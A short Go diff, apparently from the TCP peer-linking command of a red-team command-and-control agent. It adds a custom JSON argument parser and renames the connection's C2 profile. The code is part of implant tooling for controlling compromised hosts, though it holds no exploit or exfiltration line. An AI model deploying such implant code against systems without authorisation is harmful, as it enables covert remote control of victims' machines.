@@ -13,8 +13,23 @@ import (
 )
 
 type Arguments struct {
-	Port    int    `json:"port"`
-	Address string `json:"address"`
+	Port    int
+	Address string
+}
+
+func (e *Arguments) UnmarshalJSON(data []byte) error {
+	alias := map[string]interface{}{}
+	err := json.Unmarshal(data, &alias)
+	if err != nil {
+		return err
+	}
+	if v, ok := alias["port"]; ok {
+		e.Port = int(v.(float64))
+	}
+	if v, ok := alias["address"]; ok {
+		e.Address = v.(string)
+	}
+	return nil
 }
 
 // Run - package function to run link_tcp
@@ -35,7 +50,7 @@ func Run(task structs.Task) {
 		return
 	}
 	task.Job.AddInternalConnectionChannel <- structs.AddInternalConnectionMessage{
-		C2ProfileName: "poseidon_tcp",
+		C2ProfileName: "tcp",
 		Connection:    &conn,
 	}
 	msg.UserOutput = "Successfully Connected"
